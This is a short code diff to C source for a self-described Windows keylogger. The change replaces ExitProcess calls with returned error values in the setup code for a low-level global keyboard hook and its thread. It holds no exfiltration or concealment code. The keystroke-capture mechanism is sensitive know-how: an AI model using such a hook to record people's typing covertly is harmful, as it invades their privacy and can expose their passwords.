@@ -31,7 +31,7 @@ DWORD WINAPI LLKeyboardHookThread(PVOID args)
 
     LLKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
     if (!LLKeyboardHook)
-        ExitProcess(1);
+        return 1;
 
     while ((bRet = GetMessage(&msg, NULL, 0, 0))
            && (WaitForSingleObject(hKillThreadEvent, 0) != WAIT_OBJECT_0)) {
@@ -97,21 +97,23 @@ BOOL IsLegalCharacter(DWORD vkCode)
            ); //then the character is acceptable by this keylogger.
 }
 
-void StartWinKeylogger(void)
+BOOL StartWinKeylogger(void)
 {
     InitializeCriticalSection(&csReadKeystroke);
 
     hKillThreadEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
     if (!hKillThreadEvent)
-        ExitProcess(1);
+        return FALSE;
 
     hKeystrokeEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
     if (!hKeystrokeEvent)
-        ExitProcess(1);
+        return FALSE;
 
     hKeyHookThread = (HANDLE)CreateThread(NULL, 0, LLKeyboardHookThread, (PVOID)0, 0, NULL);
     if (!hKeyHookThread)
-        ExitProcess(1);
+        return FALSE;
+
+    return TRUE;
 }
 
 void RemoveWinKeylogger(void)
